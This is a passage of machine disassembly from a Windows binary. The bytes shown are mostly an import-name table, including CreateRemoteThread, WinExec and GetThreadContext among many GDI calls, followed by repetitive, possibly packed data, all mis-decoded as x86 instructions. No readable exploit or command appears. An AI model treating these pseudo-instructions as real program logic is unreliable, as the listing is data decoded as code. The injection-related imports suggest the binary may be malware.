  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
